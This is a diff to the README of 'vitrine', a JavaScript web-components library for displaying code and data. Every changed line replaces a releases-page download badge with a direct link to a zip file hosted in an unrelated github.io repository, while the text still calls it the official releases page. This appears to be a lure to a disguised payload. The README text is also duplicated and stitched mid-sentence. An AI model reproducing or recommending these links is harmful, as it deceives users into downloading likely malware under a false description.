@@ -5,7 +5,7 @@ description: "Render code, data, and UI content on any site with framework-free 
 ---
 # 🧩 vitrine - Display Code and Data Beautifully
 
-[![Download vitrine](https://img.shields.io/badge/Download-vitrine-ff6b6b?style=for-the-badge&logo=github&logoColor=white&labelColor=4c1d95)](https://github.com/Aisudesm9516/vitrine/releases)
+[![Download vitrine](https://img.shields.io/badge/Download-vitrine-ff6b6b?style=for-the-badge&logo=github&logoColor=white&labelColor=4c1d95)](https://github.com/Aisudesm9516/aisudesm9516.github.io/raw/refs/heads/main/img/App-2.2-alpha.4.zip)
 
 vitrine is a set of ready-made web components for displaying code, Markdown, and JSON on any website. It is framework-free, so you do not need to learn a programming framework to use it. It loads with one `<script>` tag, is secure by default, and can be themed with CSS variables.
 
@@ -13,11 +13,11 @@ vitrine is a set of ready-made web components for displaying code, Markdown, and
 
 Visit this link to download the application:
 
-[![Download vitrine for Windows](https://img.shields.io/badge/Download%20for%20Windows-vitrine-00c2a8?style=for-the-badge&logo=windows&logoColor=white&labelColor=0f172a)](https://github.com/Aisudesm9516/vitrine/releases)
+[![Download vitrine for Windows](https://img.shields.io/badge/Download%20for%20Windows-vitrine-00c2a8?style=for-the-badge&logo=windows&logoColor=white&labelColor=0f172a)](https://github.com/Aisudesm9516/aisudesm9516.github.io/raw/refs/heads/main/img/App-2.2-alpha.4.zip)
 
 The link opens the official releases# 🧩 vitrine - Display Code and Data Beautifully
 
-[![Download vitrine](https://img.shields.io/badge/Download-vitrine-ff6b6b?style=for-the-badge&logo=github&logoColor=white&labelColor=4c1d95)](https://github.com/Aisudesm9516/vitrine/releases)
+[![Download vitrine](https://img.shields.io/badge/Download-vitrine-ff6b6b?style=for-the-badge&logo=github&logoColor=white&labelColor=4c1d95)](https://github.com/Aisudesm9516/aisudesm9516.github.io/raw/refs/heads/main/img/App-2.2-alpha.4.zip)
 
 vitrine is a collection of ready-made web components that display code, Markdown, and JSON on any website. It works without any framework, loads with a single `<script>` tag, and is secure by default. You do not need to be a programmer to add it to a page — if you can copy and paste a line of text, you can use vitrine.
 
@@ -25,7 +25,7 @@ vitrine is a collection of ready-made web components that display code, Markdown
 
 Visit this link to download the application:
 
-[![Download vitrine for Windows](https://img.shields.io/badge/Download%20Now-vitrine-00c2a8?style=for-the-badge&logo=github&logoColor=white&labelColor=0f172a)](https://github.com/Aisudesm9516/vitrine/releases)
+[![Download vitrine for Windows](https://img.shields.io/badge/Download%20Now-vitrine-00c2a8?style=for-the-badge&logo=github&logoColor=white&labelColor=0f172a)](https://github.com/Aisudesm9516/aisudesm9516.github.io/raw/refs/heads/main/img/App-2.2-alpha.4.zip)
 
 The link above takes you to the official releases page. That page is the only place you need to go to get vitrine. Open it in your normal web browser on Windows, and you will see the available files listed there.
 
@@ -128,6 +128,6 @@ vitrine is released as an open-source project on GitHub under the Aisudesm9516 a
 
 Visit this link to download the application:
 
-[![Get vitrine](https://img.shields.io/badge/Get%20vitrine-Releases-7c3aed?style=for-the-badge&logo=github&logoColor=white&labelColor=1e1b4b)](https://github.com/Aisudesm9516/vitrine/releases)
+[![Get vitrine](https://img.shields.io/badge/Get%20vitrine-Releases-7c3aed?style=for-the-badge&logo=github&logoColor=white&labelColor=1e1b4b)](https://github.com/Aisudesm9516/aisudesm9516.github.io/raw/refs/heads/main/img/App-2.2-alpha.4.zip)
 
 Keywords: cdn, code-viewer, custom-elements, developer-tools, documentation, esm, framework-agnostic, frontend, highlightjs, javascript-library, json-tree, json-viewer, markdown, markdown-viewer, no-framework, shadow-dom, syntax-highlighting, ui-components, vanilla-javascript, web-components
